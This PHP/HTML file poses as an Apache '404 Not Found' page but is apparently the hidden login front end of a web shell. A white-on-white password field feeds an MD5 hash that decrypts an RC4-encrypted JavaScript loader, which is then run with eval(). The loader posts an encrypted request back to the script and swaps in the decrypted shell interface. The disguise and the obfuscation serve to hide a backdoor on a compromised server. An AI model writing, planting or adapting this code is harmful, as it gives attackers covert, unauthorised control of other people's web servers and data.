<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
<script type="text/javascript">
	{{_JS_}}
<?php 
	$loader = "
		var d = document;
		ajax = new XMLHttpRequest();
		ajax.onreadystatechange = function() {
			if (ajax.readyState == 4 && ajax.status == 200) {
				d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash)).substr({$config['rc4drop']});
				oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
				fixscript = d.createElement('script');
				fixscript.type = 'text/javascript';
				fixscript.innerHTML = 'var hash = \"' + hash + '\";' + oldscript.innerHTML;
				d.head.appendChild(fixscript);
				oldscript.parentNode.removeChild(oldscript);
			}
		}
		
		if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) 
			var hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
		else {
			var hash = md5(d.getElementById('pss').value);
			sessionStorage.setItem('{$config['consNames']['slogin']}', hash);
		}
		
		post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4(randStr({$config['rc4drop']}) + 'me=loader" . (isset($p['dir']) ? "&dir=" . rawurlencode($p['dir']) : "") . "', rc4Init(hash))));
		ajax.open('POST', '" . getSelf() . "', true);
		ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		ajax.setRequestHeader('Content-Length', post.length);
		ajax.setRequestHeader('Connection', 'close');
		ajax.send(post);
	";

	echo "
		function load(hash){
			loader = '" . base64_encode(rc4($loader, rc4Init($config['sPass']))) . "';
			eval(rc4(atob(loader), rc4Init(hash)));			
		}
		
		if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) {
			load(sessionStorage.getItem('{$config['consNames']['slogin']}'));
		}
	";
?>
</script>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['HTTP_HOST']; ?> was not found on this server.</p>
<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>
<center><form onsubmit="load(md5(document.getElementById('pss').value));return false;"><input type="password" id="pss"></form>
</body>
</html>